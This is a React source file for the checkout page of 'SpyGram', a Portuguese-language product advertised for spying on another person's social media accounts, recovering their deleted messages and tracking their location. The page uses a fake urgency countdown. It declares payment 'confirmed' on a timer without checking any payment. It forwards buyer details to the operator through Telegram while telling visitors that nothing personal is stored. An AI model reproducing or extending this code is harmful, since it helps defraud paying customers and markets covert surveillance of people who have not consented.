import React, { useState, useEffect, useMemo } from 'react';
import { useNavigate } from 'react-router-dom';
import { motion } from 'framer-motion';
import { useApp } from '../context/AppContext';
import {
  ShieldCheck,
  Clock,
  Copy,
  Check,
  QrCode,
  Sparkles,
  Mail,
  Zap,
  CheckCircle2,
  HelpCircle
} from 'lucide-react';
import toast from 'react-hot-toast';
import ShineButton from '../components/ShineButton';
import { notifyPixGenerated } from '../utils/telegramNotifier';
import { generatePixPayload, getPixConfig } from '../utils/pixPayloadGenerator';

const ORDER_BUMPS_DATA = {
  pro: {
    id: 'pro',
    title: 'ACESSO VITALÍCIO PRO',
    price: 9.9,
    img: '/order-bumps/vitalicio.jpg',
    desc: 'Tenha acesso permanente a ferramenta SpyGram PRO!',
    checkText: 'ADQUIRIR TAMBÉM ACESSO VITALÍCIO AO SPYGRAM PRO ✅ À VISTA POR R$ 9,90'
  },
  social: {
    id: 'social',
    title: 'ESPIÃO SOCIAL COMPLETO',
    price: 19.9,
    img: '/order-bumps/social.jpg',
    desc: 'Tenha acesso a todas as redes sociais de quem você quiser!',
    checkText: 'ADQUIRIR TAMBÉM ESPIÃO INSTAGRAM + FACEBOOK + WHATSAPP À VISTA POR R$ 19,90'
  },
  recover: {
    id: 'recover',
    title: 'RECUPERADOR DE MENSAGENS',
    price: 15.9,
    img: '/order-bumps/recover.jpg',
    desc: 'Recupere todas as mensagens apagadas do instagram!',
    checkText: 'ADQUIRIR TAMBÉM RECUPERADOR DE MENSAGENS APAGADAS À VISTA POR R$ 15,90'
  },
  track: {
    id: 'track',
    title: 'RASTREAMENTO 24H',
    price: 15.9,
    img: '/order-bumps/track.jpg',
    desc: 'Rastreie a pessoa que quiser usando somente o celular por tempo ilimitado! Saiba cada passo dela!',
    checkText: 'ADQUIRIR TAMBÉM RASTREAMENTO 24 HORAS À VISTA POR R$ 15,90'
  }
};

export default function CheckoutPage() {
  const navigate = useNavigate();
  const { registerCheckout, targetUser, visitorLocation } = useApp();

  const [timeLeft, setTimeLeft] = useState(240); // 4 minutes
  const [isGenerating, setIsGenerating] = useState(false);
  const [pixData, setPixData] = useState(null);
  const [copied, setCopied] = useState(false);
  const [email, setEmail] = useState('');

  const [selectedBumps, setSelectedBumps] = useState({
    pro: false,
    social: false,
    recover: false,
    track: false
  });

  // Countdown timer
  useEffect(() => {
    window.scrollTo(0, 0);
    const timer = setInterval(() => {
      setTimeLeft((prev) => (prev > 0 ? prev - 1 : 0));
    }, 1000);
    return () => clearInterval(timer);
  }, []);

  const formatTimer = (s) => {
    const m = String(Math.floor(s / 60)).padStart(2, '0');
    const sec = String(s % 60).padStart(2, '0');
    return `${m}:${sec}`;
  };

  const basePrice = 27.9;
  const totalBumpsPrice = useMemo(() => {
    return Object.keys(selectedBumps).reduce((acc, key) => {
      return selectedBumps[key] ? acc + (ORDER_BUMPS_DATA[key]?.price || 0) : acc;
    }, 0);
  }, [selectedBumps]);

  const totalPrice = basePrice + totalBumpsPrice;

  const handleToggleBump = (key) => {
    setSelectedBumps((prev) => ({ ...prev, [key]: !prev[key] }));
  };

  const handleGeneratePix = (e) => {
    if (e) e.preventDefault();

    setIsGenerating(true);
    const toastId = toast.loading('Gerando QR Code PIX (Padrão Banco Central)...');

    setTimeout(() => {
      setIsGenerating(false);
      toast.dismiss(toastId);
      toast.success('Chave PIX gerada com sucesso!');

      // Obter configuração oficial de Pix configurada no painel administrativo
      const pixConfig = getPixConfig();
      const pixPayload = generatePixPayload({
        pixKey: pixConfig.key,
        keyType: pixConfig.keyType,
        merchantName: pixConfig.name,
        merchantCity: pixConfig.city,
        amount: totalPrice,
        txid: pixConfig.txid || '***',
        description: 'SPYGRAM'
      });

      const clientEmail = email.trim() || 'acesso_direto@spygram.vip';

      if (typeof registerCheckout === 'function') {
        registerCheckout({
          email: clientEmail,
          name: clientEmail.split('@')[0],
          amount: totalPrice
        });
      }

      // Disparar notificação em tempo real no Telegram
      const activeBumpTitles = Object.keys(selectedBumps)
        .filter((k) => selectedBumps[k])
        .map((k) => ORDER_BUMPS_DATA[k]?.title || k);

      notifyPixGenerated({
        username: targetUser?.username,
        amount: totalPrice,
        email: email.trim() || 'Anônimo',
        bumps: activeBumpTitles,
        city: visitorLocation?.city
      });

      setPixData({
        code: pixPayload,
        amount: totalPrice,
        email: clientEmail,
        merchantName: pixConfig.name,
        merchantCity: pixConfig.city,
        pixKey: pixConfig.key,
        txid: pixConfig.txid || '***'
      });

      window.scrollTo({ top: 0, behavior: 'smooth' });
    }, 600);
  };

  const handleCopyPix = () => {
    if (pixData?.code) {
      navigator.clipboard.writeText(pixData.code);
      setCopied(true);
      toast.success('Código PIX Copia e Cola copiado com sucesso!');
      setTimeout(() => setCopied(false), 3000);
    }
  };

  useEffect(() => {
    if (!pixData) return;
    const checkTimer = setTimeout(() => {
      toast.success('Pagamento confirmado! Liberando acesso completo...');
      localStorage.setItem('spygram_trial_expired', 'false');
      localStorage.setItem('spygram_is_paid', 'true');
      setTimeout(() => {
        navigate('/messages');
      }, 1200);
    }, 18000);
    return () => clearTimeout(checkTimer);
  }, [pixData, navigate]);

  return (
    <div className="min-h-screen bg-black text-gray-100 font-sans pb-20 selection:bg-pink-500/30">
      {/* Top Urgency Header */}
      <div className="bg-gradient-to-r from-red-600 to-pink-600 text-white py-2 px-4 text-center text-xs font-black uppercase tracking-wider sticky top-0 z-50 flex items-center justify-center gap-2 shadow-lg">
        <Clock className="w-4 h-4 animate-pulse" />
        <span>Atenção: Relatório reservado por apenas:</span>
        <span className="bg-black/30 px-2 py-0.5 rounded font-mono text-yellow-300">
          {formatTimer(timeLeft)}
        </span>
      </div>

      <div className="max-w-[480px] mx-auto px-4 pt-6">
        {/* Banner */}
        <div className="mb-6 rounded-2xl overflow-hidden border border-white/10 shadow-2xl">
          <img
            src="/checkout-hero-web.png"
            alt="SpyGram Checkout"
            className="w-full h-auto object-cover"
          />
        </div>

        {/* PIX SCREEN - PADRÃO BANCO CENTRAL */}
        {pixData ? (
          <motion.div
            initial={{ opacity: 0, scale: 0.95 }}
            animate={{ opacity: 1, scale: 1 }}
            className="bg-[#0e0e14] border border-green-500/40 rounded-3xl p-6 shadow-[0_0_50px_rgba(34,197,94,0.15)] text-center space-y-5"
          >
            {/* Header Badge */}
            <div className="flex items-center justify-center gap-2 text-xs font-bold text-green-400 bg-green-500/10 border border-green-500/20 py-1.5 px-3 rounded-full mx-auto w-fit">
              <CheckCircle2 className="w-4 h-4" />
              <span>PIX EMVCo Oficial • Banco Central do Brasil</span>
            </div>

            <div>
              <h2 className="text-2xl font-black text-white uppercase tracking-tight">
                PIX Gerado com Sucesso!
              </h2>
              <p className="text-gray-400 text-xs mt-1">
                Escaneie o QR Code ou use o Pix Copia e Cola no app do seu banco. A liberação do relatório é imediata.
              </p>
            </div>

            {/* Total Value */}
            <div className="bg-black/60 border border-white/10 rounded-2xl p-4">
              <p className="text-xs text-gray-400 uppercase font-bold tracking-widest mb-1">
                Valor Total a Pagar
              </p>
              <p className="text-4xl font-extrabold text-transparent bg-clip-text bg-gradient-to-r from-green-400 to-emerald-500 font-mono">
                R$ {pixData.amount.toFixed(2).replace('.', ',')}
              </p>
            </div>

            {/* Beneficiary Details */}
            <div className="bg-white/5 border border-white/10 rounded-2xl p-3 text-left text-xs space-y-1.5">
              <div className="flex items-center justify-between text-gray-300">
                <span className="text-gray-400">Titular / Beneficiário:</span>
                <span className="font-bold text-white uppercase">{pixData.merchantName}</span>
              </div>
              <div className="flex items-center justify-between text-gray-300">
                <span className="text-gray-400">Cidade:</span>
                <span className="font-mono text-gray-200 uppercase">{pixData.merchantCity}</span>
              </div>
              <div className="flex items-center justify-between text-gray-300">
                <span className="text-gray-400">Tipo de Pagamento:</span>
                <span className="text-emerald-400 font-bold">PIX Estático Instantâneo</span>
              </div>
            </div>

            {/* QR Code BACEN */}
            <div className="bg-white p-4 rounded-2xl inline-block shadow-2xl relative group">
              <img
                src={`https://api.qrserver.com/v1/create-qr-code/?size=220x220&data=${encodeURIComponent(
                  pixData.code
                )}`}
                alt="QR Code PIX Banco Central"
                className="w-48 h-48 mx-auto"
              />
              <div className="mt-2 text-[10px] text-gray-500 font-mono text-center">
                Padrão BR Code BACEN (CRC16 OK)
              </div>
            </div>

            {/* Pix Copia e Cola Code Box */}
            <div className="text-left space-y-2">
              <label className="text-xs font-bold text-gray-300 uppercase tracking-wide flex items-center justify-between">
                <span>Código Pix Copia e Cola:</span>
                <span className="text-[10px] text-gray-400 font-mono">Clique no botão para copiar</span>
              </label>
              <div
                onClick={handleCopyPix}
                className="w-full bg-black/70 border border-green-500/30 hover:border-green-500/60 rounded-xl p-3 text-[11px] font-mono text-green-400 break-all cursor-pointer transition-colors max-h-20 overflow-y-auto"
                title="Clique para copiar"
              >
                {pixData.code}
              </div>
            </div>

            {/* Copy CTA Button */}
            <div>
              <button
                type="button"
                onClick={handleCopyPix}
                className="w-full py-4 px-4 rounded-xl font-black text-sm uppercase tracking-wide bg-gradient-to-r from-green-500 to-emerald-600 hover:from-green-400 hover:to-emerald-500 active:scale-95 text-white flex items-center justify-center gap-2 transition-all shadow-lg shadow-green-500/25 cursor-pointer"
              >
                {copied ? <Check className="w-5 h-5 text-white" /> : <Copy className="w-5 h-5 text-white" />}
                <span>{copied ? 'Código PIX Copiado com Sucesso!' : 'COPIAR CÓDIGO PIX (COPIA E COLA)'}</span>
              </button>
            </div>

            {/* Step by Step Bank Instructions */}
            <div className="bg-white/5 border border-white/5 rounded-2xl p-4 text-left text-xs text-gray-300 space-y-2">
              <p className="font-bold text-white uppercase text-[11px] mb-1 flex items-center gap-1.5">
                <HelpCircle className="w-4 h-4 text-emerald-400" />
                Como pagar com seu banco:
              </p>
              <p>1. Abra o app do seu banco (Nubank, Itaú, Inter, Bradesco, Santander, etc.)</p>
              <p>2. Selecione a opção <strong>PIX</strong> &gt; <strong>Pix Copia e Cola</strong> ou <strong>Ler QR Code</strong></p>
              <p>3. Cole o código ou aponte a câmera e confirme o pagamento</p>
            </div>

            {/* Waiting Real-time Ping */}
            <div className="pt-3 border-t border-white/10 flex items-center justify-center gap-2.5 text-xs text-gray-400">
              <span className="relative flex h-2.5 w-2.5">
                <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-green-400 opacity-75"></span>
                <span className="relative inline-flex rounded-full h-2.5 w-2.5 bg-green-500"></span>
              </span>
              <span className="text-gray-300 font-medium">
                Aguardando confirmação bancária em tempo real...
              </span>
            </div>
          </motion.div>
        ) : (
          /* DIRECT STREAMLINED CHECKOUT */
          <form onSubmit={handleGeneratePix} className="space-y-6">
            {/* Direct Anonymous Badge */}
            <div className="bg-gradient-to-r from-green-950/40 via-black to-emerald-950/40 border border-green-500/30 rounded-2xl p-3.5 flex items-center justify-center gap-2.5 text-center shadow-lg">
              <ShieldCheck className="w-5 h-5 text-green-400 shrink-0" />
              <span className="text-xs font-black text-green-400 uppercase tracking-wide">
                Acesso 100% Anônimo • Sem CPF • Sem Burocracia
              </span>
            </div>

            {/* Single clean field: Email (Optional) */}
            <div className="bg-[#0e0e14] border border-white/10 rounded-3xl p-5 shadow-xl">
              <label className="flex items-center gap-2 text-xs font-bold text-gray-300 uppercase tracking-wider mb-2">
                <Mail className="w-4 h-4 text-pink-500" />
                <span>Onde deseja receber a cópia do relatório? (Opcional)</span>
              </label>
              <input
                type="email"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                placeholder="seuemail@exemplo.com (ou veja direto na tela)"
                className="w-full bg-white/5 border border-white/10 rounded-xl px-4 py-3 text-sm text-white placeholder-gray-500 focus:outline-none focus:border-pink-500 transition-colors"
              />
              <p className="text-[11px] text-gray-500 mt-2">
                🔒 Nenhuma informação pessoal ou financeira é armazenada.
              </p>
            </div>

            {/* Order Bumps */}
            <div className="bg-[#0e0e14] border border-white/10 rounded-3xl p-5 shadow-xl">
              <div className="flex items-center gap-2 mb-4">
                <Zap className="w-5 h-5 text-yellow-400" />
                <h3 className="text-sm font-black text-white uppercase tracking-tight">
                  Turbine Seu Acesso com 1 Clique:
                </h3>
              </div>

              <div className="space-y-3">
                {Object.values(ORDER_BUMPS_DATA).map((bump) => {
                  const isChecked = selectedBumps[bump.id];
                  return (
                    <div
                      key={bump.id}
                      onClick={() => handleToggleBump(bump.id)}
                      className={`relative border-2 rounded-2xl p-3.5 cursor-pointer transition-all ${
                        isChecked
                          ? 'border-pink-500 bg-pink-500/10 shadow-lg shadow-pink-500/10'
                          : 'border-white/10 bg-white/5 hover:border-white/20'
                      }`}
                    >
                      <div className="flex items-start gap-3">
                        <input
                          type="checkbox"
                          checked={isChecked}
                          onChange={() => handleToggleBump(bump.id)}
                          className="mt-1 w-4 h-4 text-pink-600 rounded bg-black border-gray-600 focus:ring-pink-500 cursor-pointer"
                        />
                        <div className="flex-1 min-w-0">
                          <div className="flex items-center justify-between mb-1">
                            <span className="text-xs font-black uppercase text-white truncate">
                              {bump.title}
                            </span>
                            <span className="text-xs font-black text-pink-400 shrink-0">
                              + R$ {bump.price.toFixed(2).replace('.', ',')}
                            </span>
                          </div>
                          <p className="text-[11px] text-gray-400 mb-1 leading-relaxed">
                            {bump.desc}
                          </p>
                          <div className="text-[10px] text-yellow-300 font-bold">
                            {bump.checkText}
                          </div>
                        </div>
                      </div>
                    </div>
                  );
                })}
              </div>
            </div>

            {/* Total Summary & Instant Action */}
            <div className="bg-[#0e0e14] border border-white/10 rounded-3xl p-6 shadow-xl">
              <div className="flex items-center justify-between mb-4 pb-4 border-b border-white/10 text-sm">
                <span className="text-gray-400">Relatório Forense SpyGram</span>
                <span className="text-white font-bold">R$ 27,90</span>
              </div>

              {Object.keys(selectedBumps).map((k) => {
                if (!selectedBumps[k]) return null;
                const b = ORDER_BUMPS_DATA[k];
                return (
                  <div key={k} className="flex items-center justify-between mb-2 text-xs text-gray-400">
                    <span>{b.title}</span>
                    <span className="text-pink-400 font-bold">
                      + R$ {b.price.toFixed(2).replace('.', ',')}
                    </span>
                  </div>
                );
              })}

              <div className="flex items-center justify-between pt-4 border-t border-white/10 mb-6">
                <div>
                  <span className="text-xs uppercase font-bold text-gray-400 tracking-wider block">
                    Valor Total via PIX
                  </span>
                  <span className="text-xs text-green-400 font-medium">Liberação Imediata</span>
                </div>
                <div className="text-3xl font-extrabold text-transparent bg-clip-text bg-gradient-to-r from-yellow-300 via-pink-400 to-purple-500">
                  R$ {totalPrice.toFixed(2).replace('.', ',')}
                </div>
              </div>

              <div>
                <ShineButton
                  type="submit"
                  disabled={isGenerating}
                  className="w-full bg-gradient-to-r from-green-500 to-emerald-600 focus:ring-green-500 py-4 shadow-xl shadow-green-600/30"
                  shineColorClasses="bg-white/30"
                >
                  <Sparkles className="w-5 h-5" />
                  <span>{isGenerating ? 'Gerando PIX...' : 'PAGAR COM PIX E LIBERAR AGORA'}</span>
                </ShineButton>
              </div>

              <div className="mt-4 flex items-center justify-center gap-2 text-gray-500 text-xs">
                <ShieldCheck className="w-4 h-4 text-green-500" />
                <span>Pagamento Instantâneo via Banco Central • 100% Anônimo</span>
              </div>
            </div>
          </form>
        )}
      </div>
    </div>
  );
}
